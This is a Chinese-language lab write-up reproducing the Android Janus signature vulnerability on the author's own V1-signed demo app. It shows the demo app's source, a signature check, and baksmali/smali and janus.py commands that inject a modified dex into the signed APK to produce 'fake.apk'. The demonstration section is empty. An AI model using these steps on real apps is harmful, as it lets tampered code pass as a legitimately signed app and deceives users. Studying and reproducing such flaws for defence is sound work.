# Android
> 漏洞复现：仅描述具体的复现过程，关于Janus漏洞原理和复现详情：https://drag0nf1y.github.io/
Janus漏洞复现：
## 复现过程
### 材料准备

#### 创建原始APP
MainActivity.java
```java
package com.example.a;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity implements View.OnClickListener{

    private Button button;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        button = (Button) findViewById(R.id.button);
        button.setOnClickListener(this);
    }

    @Override
    public void onClick(View v) {
        Toast.makeText(getApplicationContext(),"I am QT!!!",Toast.LENGTH_LONG).show();
    }
}
```
activity_main.xml
```xml
<?xml version="1.0" encoding="utf-8"?>
<android.support.constraint.ConstraintLayout
    xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".MainActivity">

    <Button
        android:id="@+id/button"
        android:layout_width="117dp"
        android:layout_height="57dp"
        android:layout_gravity="center_horizontal"
        android:text="button"
        tools:ignore="MissingConstraints"
        tools:layout_editor_absoluteX="138dp"
        tools:layout_editor_absoluteY="324dp" />
</android.support.constraint.ConstraintLayout>
```
编译后，使用V1签名，而不使用V2签名
#### 检查原始APP
```c
C:\Users\伊木\Desktop\工具集\moblietools>java -jar GetAPKInfo.jar app-release.apk
执行结果: 成功
应用信息:
  包名: com.example.a
  版本名: 1.0
  版本号: 1
  签名文件MD5: 81d388301593097620b9e80d01a22a42
  SDK版本:
      minSdkVersion:22
      targetSdkVersion:28
  V1签名验证通过: true
  使用V2签名: false
  V2签名验证通过: false
  使用V3签名: false
  V3签名验证通过: false
  签名验证详细信息: {"ret":0,"msg":"","isV1OK":true,"isV2":false,"isV2OK":false,"isV3":false,"isV3OK":false,"keystoreMd5":"81d388301593097620b9e80d01a22a42"}
```
可见刚刚所编译得到的app是V1签名的，而不是V2签名的。
接下来进行攻击。

### 攻击过程
* apk直接解压得到dex文件

* 反编译dex文件
```c
java -jar baksmali-2.3.3.jar d classes.dex
```
得到的out文件中：
android/
androidx/
com

源文件在包com.example.a中。
* 修改源文件中，我们需要修改的部分，在这里我修改了字符串

* 重新打包得到dex
```c
java -jar smali-2.3.3.jar assemble out
```
在目录下重新生成out.dex
* 将dex放入原Janus.apk里
```c
python janus.py out.dex app-release.apk fake.apk
```
### 演示
